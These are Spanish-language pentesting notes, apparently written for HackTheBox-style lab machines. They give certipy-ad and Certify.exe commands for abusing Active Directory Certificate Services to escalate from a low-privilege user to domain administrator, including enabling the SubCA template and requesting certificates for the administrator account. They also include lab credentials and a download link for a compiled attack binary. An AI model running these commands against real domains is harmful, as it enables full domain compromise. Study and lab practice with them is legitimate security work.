

### IDENTIFICAMOS
```shell
#LO PODEMOS IDENTIFICAR CUANDO VEMOS QUE PERTENECEMOS A UN GRUPO COMO ESTE
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
```
### ESCALADA
```shell
certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable #IDENTIFICAMOS CERTIFICADOS
certipy-ad find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable


certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven -debug

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -list-templates

certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb

certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 13

certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 20


sudo ntpdate -s manager.htb
certipy-ad auth -pfx administrator.pfx
```

### INTERNA
```shell
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Certify.exe
upload Certify.exe

#ENUMERAMOS INFORMACIÓN
.\Certify.exe cas
.\Certify.exe find /vulnerable

#DESDE NUESTRA MÁQUINA
sudo certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
sudo certipy-ad auth -pfx administrator.pfx
```